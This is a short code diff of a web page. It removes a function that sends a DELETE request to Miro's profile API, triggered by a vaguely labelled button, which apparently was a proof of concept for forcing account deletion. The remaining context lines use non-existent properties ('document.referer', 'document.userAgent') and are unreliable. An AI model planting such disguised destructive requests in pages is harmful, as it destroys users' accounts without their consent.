@@ -6,29 +6,5 @@ document.write(document.referer+'</br>');
 document.write(document.userAgent+'</br>');
 
 
-function deleteProfile() {
-  const endpointUrl = 'https://miro.com/api/v1/profile';
-
-  const xhr = new XMLHttpRequest();
-  xhr.open('DELETE', endpointUrl, true);
-
-  xhr.onload = function () {
-    if (xhr.status >= 200 && xhr.status < 300) {
-      // Gestisci la risposta in caso di successo
-      console.log('Risposta:', xhr.responseText);
-    } else {
-      // Gestisci errori qui (ad esempio, status code diverso da 2xx)
-      console.error('Errore:', xhr.status, xhr.statusText);
-    }
-  };
-
-  xhr.onerror = function () {
-    // Gestisci eventuali errori di connessione o problemi di rete
-    console.error('Errore di rete');
-  };
-
-  xhr.send();
-}
 
 </script>
-<button onclick="deleteProfile();">xxx</button> 
